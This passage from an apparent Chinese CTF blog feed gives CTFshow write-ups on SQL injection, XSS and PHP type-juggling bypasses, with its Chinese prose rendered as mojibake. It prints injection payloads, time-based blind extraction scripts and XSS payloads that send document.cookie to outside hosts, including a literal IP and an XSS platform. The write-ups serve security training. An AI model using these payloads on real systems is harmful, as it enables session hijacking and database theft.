punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:filelist.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Error: "</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹åˆ°filetypeå˜é‡ç¡®å®é€šè¿‡finfoå–äº†å†…å®¹ï¼Œæˆ‘ä»¬æœ¬åœ°è·‘ä¸€ä¸‹</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208302009630.png"></p><p>ç¡®å®è¾“å‡ºäº†éƒ¨åˆ†çš„æ–‡ä»¶ä¿¡æ¯ï¼Œçœ‹ç¾¤é‡Œç»™çš„payloadï¼Œä½¿ç”¨çš„æ˜¯binæ–‡ä»¶ï¼Œæ„é€ çš„æ–‡ä»¶éƒ¨åˆ†å†…å®¹è¢«è¾“å‡º</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208302053318.png"></p><p>ä¸Šä¼ æ‹¿shellå³å¯</p><p>åè®°ï¼šä¼¼ä¹è¿™é‡Œæ‹¿åˆ°çš„æ˜¯fileå‘½ä»¤è·å–çš„å†…å®¹</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208302055956.png"></p><p><strong>225</strong></p><p>å †å ï¼š</p><pre class="line-numbers language-none"><code class="language-none">prepare a from 0xåå…­è¿›åˆ¶è¯­å¥;execute a;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>226</strong></p><p>åŒä¸Š</p><p><strong>227</strong></p><p>æ²¡æŸ¥å‡ºæ¥ä¸œè¥¿ï¼Œçœ‹WPï¼Œé€šè¿‡æŸ¥è¯¢<code>information_schema.routines</code>æŸ¥çœ‹å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°</p><blockquote><p>å­˜å‚¨è¿‡ç¨‹ï¼ˆStored Procedureï¼‰æ˜¯ä¸€ç§åœ¨æ•°æ®åº“ä¸­å­˜å‚¨å¤æ‚ç¨‹åºï¼Œä»¥ä¾¿å¤–éƒ¨ç¨‹åºè°ƒç”¨çš„ä¸€ç§æ•°æ®åº“å¯¹è±¡ã€‚<br>å­˜å‚¨è¿‡ç¨‹æ˜¯ä¸ºäº†å®Œæˆç‰¹å®šåŠŸèƒ½çš„SQLè¯­å¥é›†ï¼Œç»ç¼–è¯‘åˆ›å»ºå¹¶ä¿å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œç”¨æˆ·å¯é€šè¿‡æŒ‡å®šå­˜å‚¨è¿‡ç¨‹çš„åå­—å¹¶ç»™å®šå‚æ•°(éœ€è¦æ—¶)æ¥è°ƒç”¨æ‰§è¡Œã€‚<br>å­˜å‚¨è¿‡ç¨‹æ€æƒ³ä¸Šå¾ˆç®€å•ï¼Œå°±æ˜¯æ•°æ®åº“ SQL è¯­è¨€å±‚é¢çš„ä»£ç å°è£…ä¸é‡ç”¨ã€‚</p></blockquote><p>å°±æ˜¯å­˜äº†å·²ç»å®šä¹‰å¥½çš„å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°getFlagå‡½æ•°ï¼Œä¹Ÿèƒ½çœ‹åˆ°flagï¼Œè°ƒç”¨çš„è¯ä½¿ç”¨call getFlagå°±å¥½</p><p><strong>228,229,230</strong></p><p>éƒ½æ˜¯ä¸Šé¢çš„</p><p><strong>231</strong></p><p>updateå¼€å§‹ï¼Œç¬¬ä¸€é“é¢˜ç›´æ¥è¿ç€usernameä¸€èµ·æ”¹</p><pre class="line-numbers language-none"><code class="language-none">password&#x3D;0&#39;,username&#x3D;(select group_concat(flagas) from flaga where table_schema&#x3D;database())%23&amp;username&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>232</strong></p><p>md5é—®é¢˜ä¸å¤§ï¼Œå¤šè£¹ä¸ªæ‹¬å·å°±è¡Œ</p><pre class="line-numbers language-none"><code class="language-none">password&#x3D;0&#39;),username&#x3D;(select group_concat(flagass) from flagaa)%23&amp;username&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>233</strong></p><p>ä¼¼ä¹å•å¼•å·æ¶ˆå¤±äº†ï¼Œè½¬ä¹‰ç„¶åå’Œåé¢usernameçš„é—­åˆå°±è¡Œ</p><pre class="line-numbers language-none"><code class="language-none">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(flagass233) from flag233333)%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>234</strong></p><p>å•åŒä¸€èµ·ï¼ŒåŒä¸Š</p><pre class="line-numbers language-none"><code class="language-none">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(flagass23s3) from flag23a)%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>235</strong></p><p>æ— åˆ—åæ³¨å…¥ï¼Œçœ‹<a href="https://blog.csdn.net/qq_31620591/article/details/117067799">è¿™é‡Œ</a></p><pre class="line-numbers language-none"><code class="language-none">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(&#96;2&#96;) from (select 1,2,3 union select * from flag23a1) as a)%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>236</strong></p><p>å¤šæ»¤äº†ä¸ªflagï¼Œæ²¡åµç”¨</p><pre class="line-numbers language-none"><code class="language-none">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(&#96;2&#96;)  from (select 1,2,3 union select * from flaga) as a)%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>237</strong></p><p>è¿›å…¥insertç¯èŠ‚ï¼Œé—­åˆï¼Œæ‹¿æ•°æ®ï¼Œæ’å…¥</p><pre class="line-numbers language-none"><code class="language-none">username&#x3D;1&#39;,(select group_concat(flagass23s3) from flag))%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>238</strong></p><p>æ²¡æœ‰ç©ºæ ¼ç”¨æ‹¬å·</p><pre class="line-numbers language-none"><code class="language-none">username&#x3D;1&#39;,(select(group_concat(flag))from(flagb)))%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>239</strong></p><p>åˆä¸€ä¸ªæ— åˆ—åï¼Œæ³¨ä¸è¿›å»ï¼Œä¹Ÿä¸çŸ¥é“å“ªé‡Œå‡ºé—®é¢˜äº†</p><p><strong>240</strong></p><p>æœ‰è¡¨åé‚£ä¸ç‹ ç‹ çš„çˆ†ç ´ï¼Ÿ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> itertools<span class="token keyword">import</span> timeurl<span class="token operator">=</span><span class="token string">"http://6be0cd82-3931-4919-a3e1-bfdcd72e685a.challenge.ctf.show/api/insert.php"</span>s<span class="token operator">=</span><span class="token string">'ab'</span>a<span class="token operator">=</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">,</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span><span class="token string">'ab'</span><span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span>    table<span class="token operator">=</span><span class="token string">'flag'</span><span class="token operator">+</span>i<span class="token punctuation">;</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"1',(select(flag)from(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string">)))#"</span></span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'1'</span><span class="token punctuation">&#125;</span>    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>241</strong></p><p>å¼€å§‹åˆ ä¸œè¥¿äº†ï¼Œå°±20æ¡ï¼Œç”¨æ—¶é—´ç›²æ³¨å§ï¼Œè„šæœ¬from yuå¸ˆå‚…</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># @Author:yu22x</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parseurl <span class="token operator">=</span> <span class="token string">"http://b37e7121-22c6-4917-bfa5-ddc38a0ed78f.challenge.ctf.show/api/delete.php"</span>s<span class="token operator">=</span><span class="token string">'0123456789abcdef-'</span>flag<span class="token operator">=</span><span class="token string">'ctfshow&#123;'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> s<span class="token punctuation">:</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'id'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f'0||if(substr((select flag from flag),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">",sleep(1),0)'</span></span><span class="token punctuation">&#125;</span><span class="token comment">#print(data)</span><span class="token keyword">try</span><span class="token punctuation">:</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>flag<span class="token operator">+=</span>j  <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">break</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>242</strong></p><p>è¿›è¡Œä¸€ä¸ªæ–‡ä»¶çš„dump</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowXSS</title>
      <link href="/posts/36544.html"/>
      <url>/posts/36544.html</url>
      
        <content type="html"><![CDATA[<p>é¦–å…ˆè‡ªå·±æ­å»ºæˆ–è€…æ‰¾<a href="https://xss8.cc/login/">xssæµ‹è¯•å¹³å°</a>è¿˜æœ‰<a href="https://xss.pt/">å¦ä¸€ä¸ª</a></p><p><strong>316</strong></p><pre class="line-numbers language-none"><code class="language-none">æœ€ç®€å•çš„ï¼š&lt;script&gt;document.location.href&#x3D;&#39;http:&#x2F;&#x2F;æœåŠ¡å™¨IP&#x2F;?x&#x3D;&#39;document.cookie&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>317</strong></p><p>è¿‡æ»¤äº†script</p><pre class="line-numbers language-none"><code class="language-none">&lt;body onload&#x3D;&quot;document.location.href&#x3D;&#39;http:&#x2F;&#x2F;æœåŠ¡å™¨IP&#x2F;?x&#x3D;&#39;+document.cookie&quot;&gt;&lt;&#x2F;body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>318</strong></p><p>è¿‡æ»¤äº†imgï¼Œä½¿ç”¨iframe</p><pre class="line-numbers language-none"><code class="language-none">&lt;iframe WIDTH&#x3D;0 HEIGHT&#x3D;0 srcdoc&#x3D;ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚&amp;#60;&amp;#115;&amp;#67;&amp;#82;&amp;#105;&amp;#80;&amp;#116;&amp;#32;&amp;#115;&amp;#82;&amp;#67;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#48;&amp;#120;&amp;#46;&amp;#97;&amp;#120;&amp;#47;&amp;#107;&amp;#48;&amp;#74;&amp;#106;&amp;#34;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#67;&amp;#114;&amp;#73;&amp;#112;&amp;#84;&amp;#62;&gt;&lt;BODYONLOAD&#x3D;document.location&#x3D;&#39;http:&#x2F;&#x2F;xss.darkflow.top?cookie&#x3D;&#39;+document.cookie;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>319</strong></p><p>åŒä¸Šå³å¯</p><p><strong>320</strong></p><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œscriptï¼Œç”¨tab</p><pre class="line-numbers language-none"><code class="language-none">&lt;iframeWIDTH&#x3D;0HEIGHT&#x3D;0srcdoc&#x3D;ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚&amp;#60;&amp;#115;&amp;#67;&amp;#82;&amp;#105;&amp;#80;&amp;#116;&amp;#32;&amp;#115;&amp;#82;&amp;#67;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#48;&amp;#120;&amp;#46;&amp;#97;&amp;#120;&amp;#47;&amp;#107;&amp;#48;&amp;#74;&amp;#106;&amp;#34;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#67;&amp;#114;&amp;#73;&amp;#112;&amp;#84;&amp;#62;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>321</strong></p><p>è¿‡æ»¤äº†imgï¼ŒåŒä¸Š</p><p><strong>322</strong></p><p>åŒä¸Š</p><p><strong>323</strong></p><p>è¿‡æ»¤äº†iframeï¼Œä½¿ç”¨body onloadï¼ˆè‰¹å±…ç„¶è¿‡æ»¤äº†xssï¼Œæˆ‘çš„åŸŸåé‡Œæœ‰xsså•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šï¼‰</p><pre class="line-numbers language-none"><code class="language-none">&lt;body&#x2F;onload&#x3D;document.location&#x3D;&#39;http:&#x2F;&#x2F;20.231.29.154:5000&#x2F;?cookie&#x3D;&#39;+document.cookie;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸€ç›´åˆ°326é€šæ€</p><p>æµ…æ€»ç»“ï¼šçœ‹è¿™å‡ é“é¢˜æ¥è¯´ï¼Œåå°„æ€§xssæ— éå°±æ˜¯å˜æ¢æ ‡ç­¾ï¼Œç»“åˆå„ç§ç¼–ç å»ç»•è¿‡ï¼Œç©ºæ ¼ç”¨<code>\</code>ï¼Œå…³é”®å­—åŒå†™æˆ–è€…ç¼–ç ç­‰ç­‰</p><p>å­˜å‚¨å‹XSSå¼€å§‹</p><p><strong>327</strong></p><p>æ”¶ä»¶äººä¸ºadminï¼Œå†…å®¹ä¸ºXSSå³å¯</p><pre class="line-numbers language-none"><code class="language-none">&lt;body&#x2F;onload&#x3D;document.location&#x3D;&#39;http:&#x2F;&#x2F;20.231.29.154:5000&#x2F;?cookie&#x3D;&#39;+document.cookie;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>328</strong></p><p>æ„é€ jså·ç®¡ç†å‘˜cookieï¼ˆä¸çŸ¥é“ä¸ºå•¥æˆ‘å·äº†ç™»é™†äº†ä¹Ÿä¸è¡Œï¼‰</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-20">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-20</a> 17.41.19.png)</p><p>ç”¨è¶…å¼ºæ¨¡å—å§</p><pre class="line-numbers language-none"><code class="language-none">&lt;sCRiPt sRC&#x3D;&#x2F;&#x2F;xss8.cc&#x2F;R9YM&gt;&lt;&#x2F;sCrIpT&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowPHPç‰¹æ€§</title>
      <link href="/posts/47427.html"/>
      <url>/posts/47427.html</url>
      
        <content type="html"><![CDATA[<p><strong>89</strong></p><p>æ•°ç»„ç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">intval()ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼intval() å‡½æ•°é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶baseè½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡varçš„integeræ•°å€¼ã€‚intval()ä¸èƒ½ç”¨äºobjectï¼Œå¦åˆ™ä¼šäº§ç”ŸE_NOTICEé”™è¯¯å¹¶è¿”å›1ã€‚è¯­æ³•int intval ( mixed $var [, int $base &#x3D; 10 ] )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>90</strong></p><p>åå…­è¿›åˆ¶</p><p><strong>91</strong></p><pre class="line-numbers language-none"><code class="language-none">if(preg_match(&#39;&#x2F;^php$&#x2F;im&#39;, $a))&#123;    if(preg_match(&#39;&#x2F;^php$&#x2F;i&#39;, $a))&#123;        echo &#39;hacker&#39;;    &#125;&#x2F;&#x2F;mä»£è¡¨å¤šè¡ŒåŒ¹é…ï¼Œæ¢è¡Œç¬¦åŠ phpå³å¯&#x2F;&#x2F;cmd&#x3D;%0Aphp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>92</strong></p><p>åŒ90</p><p><strong>93</strong></p><p>æ»¤äº†16è¿›åˆ¶ï¼Œä½¿ç”¨8è¿›åˆ¶ç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">?num&#x3D;010574<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>94</strong></p><p>å…¨ç­‰ç”¨å°æ•°ç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">?num&#x3D;4476.01<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>95</strong></p><p>å°æ•°ç‚¹æ²¡äº†ï¼Œç”¨å…«è¿›åˆ¶åŠ æ­£å·ç»•è¿‡0è¿‡æ»¤</p><pre class="line-numbers language-none"><code class="language-none">?num&#x3D;+010574<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>96</strong></p><pre class="line-numbers language-none"><code class="language-none">?u&#x3D;.&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>97</strong></p><p>md5å¼ºç›¸ç­‰æ•°ç»„ç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">a[]&#x3D;1&amp;b[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>98</strong></p><p>åˆ†æä»£ç </p><pre class="line-numbers language-none"><code class="language-none">3.$_GET?$_GET&#x3D;&amp;$_POST:&#39;flag&#39;;    if ($_GET) &#123;&#x2F;&#x2F;åªè¦æœ‰è¾“å…¥çš„getå‚æ•°        $_GET &#x3D; &amp;$_POST; &#x2F;&#x2F;å°±å°†getæ–¹æ³•æ”¹å˜ä¸ºpostæ–¹æ³•(ä¿®æ”¹äº†getæ–¹æ³•çš„åœ°å€)        &#x2F;&#x2F; æ¯”å¦‚$_GET[a] &#x3D; &amp;$_POST[a]ï¼Œgetä¼ aæ— ä½œç”¨ï¼Œå¿…é¡»ç”¨POST    &#125; else &#123;        &quot;flag&quot;;    &#125;4ã€5è¡Œæ— ä½œç”¨6.highlight_file($_GET[&#39;HTTP_FLAG&#39;]&#x3D;&#x3D;&#39;flag&#39;?$flag:__FILE__);    if ($_GET[&#39;HTTP_FLAG&#39;] &#x3D;&#x3D; &#39;flag&#39;) &#123; &#x2F;&#x2F;éœ€è¦æ»¡è¶³è¿™ä¸ªæ¡ä»¶å°±å¯ä»¥è¾“å‡ºflag        highlight_file($flag);&#x2F;&#x2F;å› ä¸ºæ²¡æœ‰ctfshow&#123;xxxxx&#125;è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥ä¼šäº§ç”ŸæŠ¥é”™        &#x2F;&#x2F;è¿›è€Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°flagå†…å®¹    &#125; else &#123;        highlight_file(__FILE__);    &#125;æ„é€ POSTHTTP_FLAG&#x3D;flagå†æ·»åŠ ä»»æ„getå‚æ•°å³å¯<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>99</strong></p><pre class="line-numbers language-none"><code class="language-none">in_arrayå‡½æ•°å¦‚æœä¸è®¾ç½®strictå‚æ•°ä¸ºçœŸåˆ™è¿›è¡Œè‹¥æ¯”è¾ƒï¼Œ1.php&#x3D;&#x3D;1payloadï¼šn&#x3D;1.phpPOSTcontent&#x3D;ä¸€å¥è¯æœ¨é©¬<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>100</strong></p><p>åœ¨PHPä¸­ï¼Œ=èµ‹å€¼è¿ç®—ç¬¦ä¼˜å…ˆçº§é«˜äºandï¼Œæ‰€ä»¥è¯­å¥æ‰§è¡Œæ˜¯v0=is_numeric(v1)ï¼Œä¼ å…¥v1ä¸ºæ•°å­—å³å¯</p><pre class="line-numbers language-none"><code class="language-none">?v1&#x3D;1&amp;v2&#x3D;var_dump($ctfshow)&amp;v3&#x3D;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>101</strong></p><p>åå°„ç±»</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯ä¸€ä¸ªç±»çš„åå°„ï¼ˆåºŸè¯ä¹ˆä¸æ˜¯ï¼‰ä¸‹é¢æ˜¯ä¾‹å­<span class="token keyword">class</span> <span class="token class-name-definition class-name">fuc</span> <span class="token punctuation">&#123;</span> <span class="token comment">//å®šä¹‰ä¸€ä¸ªç±»</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">ec</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'æˆ‘æ˜¯ä¸€ä¸ªç±»'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ReflectionClass</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fuc'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å»ºç«‹ fucè¿™ä¸ªç±»çš„åå°„ç±»</span><span class="token variable">$fuc</span><span class="token operator">=</span><span class="token variable">$class</span><span class="token operator">-></span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ç›¸å½“äºå®ä¾‹åŒ– fuc ç±»</span><span class="token variable">$fuc</span><span class="token operator">-></span><span class="token function">ec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ‰§è¡Œ fuc é‡Œçš„æ–¹æ³•ec</span><span class="token variable">$ec</span><span class="token operator">=</span><span class="token variable">$class</span><span class="token operator">-></span><span class="token function">getmethod</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ec'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è·å–fuc ç±»ä¸­çš„ecæ–¹æ³•</span><span class="token variable">$fuc</span><span class="token operator">=</span><span class="token variable">$class</span><span class="token operator">-></span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å®ä¾‹åŒ–</span><span class="token variable">$ec</span><span class="token operator">-></span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token variable">$fuc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//æ‰§è¡Œec æ–¹æ³•</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Payload</p><pre class="line-numbers language-none"><code class="language-none">?v1&#x3D;1&amp;v2&#x3D;echo new Reflectionclass&amp;v3&#x3D;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>102</strong></p><pre class="line-numbers language-none"><code class="language-none">å…ˆè½¬base64å†è½¬16è¿›åˆ¶å®Œæˆç»•è¿‡<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>103</strong></p><p>åŒä¸Š</p><p><strong>104</strong></p><p>æ²¡éªŒè¯ç›´æ¥ä¼ ä¿©ä¸€æ ·çš„å‘—</p><p><strong>105</strong></p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">foreach($_GET as $key &#x3D;&gt; $value)&#123;    if($key&#x3D;&#x3D;&#x3D;&#39;error&#39;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key&#x3D;$$value;&#125;foreach($_POST as $key &#x3D;&gt; $value)&#123;    if($value&#x3D;&#x3D;&#x3D;&#39;flag&#39;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key&#x3D;$$value;&#125;å¤šç§æ“ä½œæ–¹æ³•é€šè¿‡die($error)è¾“å‡ºpayload:a&#x3D;flag POST: error&#x3D;aè¿›è¡Œçš„æ“ä½œä¸º$a&#x3D;$flag;$error&#x3D;$a;æ­¤æ—¶$a&#x3D;flag&#123;test123&#125;;$error&#x3D;flag&#123;test123&#125;;ä»è€Œè¾“å‡ºerrorä¹Ÿå°±æ˜¯è¾“å‡ºflagé€šè¿‡die($suces)payload:suces&#x3D;flag&amp;flag&#x3D;è¿›è¡Œçš„æ“ä½œä¸º$suces&#x3D;$flag;<span aria-hidden="true" 